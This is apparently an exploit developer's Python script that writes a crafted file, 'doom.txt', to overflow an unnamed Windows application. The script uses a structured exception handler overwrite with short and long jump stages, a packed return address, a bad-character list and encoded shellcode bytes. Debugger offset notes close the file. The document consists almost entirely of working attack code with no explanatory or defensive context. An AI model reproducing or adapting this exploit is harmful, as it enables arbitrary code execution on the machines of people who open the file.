import struct
f = open("doom.txt","wb")
#\x0d"
#badchars 0xa 0xd 1a 0x9
#buff = b"A"*4112 #final paylaod
nseh_stage1 = b"\x90\x90\xEB\xF6" # JMP back 10 bytes
jmp450_stage2 = b"\x90\x90\x90\xE9\xf4\xef\xFF\xFF" # Have it hit our long jump back 450
shellcode =  b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += b"\xb8\x8b\xdf\x1b\x92\xdb\xc4\xd9\x74\x24\xf4\x5f\x29"
shellcode += b"\xc9\xb1\x32\x83\xc7\x04\x31\x47\x0e\x03\xcc\xd1\xf9"
shellcode += b"\x67\x2e\x05\x7f\x87\xce\xd6\xe0\x01\x2b\xe7\x20\x75"
shellcode += b"\x38\x58\x91\xfd\x6c\x55\x5a\x53\x84\xee\x2e\x7c\xab"
shellcode += b"\x47\x84\x5a\x82\x58\xb5\x9f\x85\xda\xc4\xf3\x65\xe2"
shellcode += b"\x06\x06\x64\x23\x7a\xeb\x34\xfc\xf0\x5e\xa8\x89\x4d"
shellcode += b"\x63\x43\xc1\x40\xe3\xb0\x92\x63\xc2\x67\xa8\x3d\xc4"
shellcode += b"\x86\x7d\x36\x4d\x90\x62\x73\x07\x2b\x50\x0f\x96\xfd"
shellcode += b"\xa8\xf0\x35\xc0\x04\x03\x47\x05\xa2\xfc\x32\x7f\xd0"
shellcode += b"\x81\x44\x44\xaa\x5d\xc0\x5e\x0c\x15\x72\xba\xac\xfa"
shellcode += b"\xe5\x49\xa2\xb7\x62\x15\xa7\x46\xa6\x2e\xd3\xc3\x49"
shellcode += b"\xe0\x55\x97\x6d\x24\x3d\x43\x0f\x7d\x9b\x22\x30\x9d"
shellcode += b"\x44\x9a\x94\xd6\x69\xcf\xa4\xb5\xe7\x0e\x3a\xc0\x4a"
shellcode += b"\x10\x44\xca\xfa\x79\x75\x41\x95\xfe\x8a\x80\xd1\xf1"
shellcode += b"\xc0\x88\x70\x9a\x8c\x59\xc1\xc7\x2e\xb4\x06\xfe\xac"
shellcode += b"\x3c\xf7\x05\xac\x35\xf2\x42\x6a\xa6\x8e\xdb\x1f\xc8"
shellcode += b"\x3d\xdb\x35\xa6\xae\x57\xd3\x46\x50\xfc\x35\xc3\xea"
shellcode += b"\x99\x49"



buff = shellcode
buff += b"A"*(4112-len(nseh_stage1+jmp450_stage2+shellcode))+jmp450_stage2+nseh_stage1+struct.pack("<L",(0x00481b35))
buff += b"D"*(2000)
buff += b"C"*(10000-len(buff))
print(buff)
f.write(buff)
f.close()
#-0e2c-24-a+c
#0c48
"""
0:000> ?0x100c+32e
Evaluate expression: 4922 = 0000133a
SAU CU - 
"""#ori 9aa ori 101c

#ori 00001007 ori 1031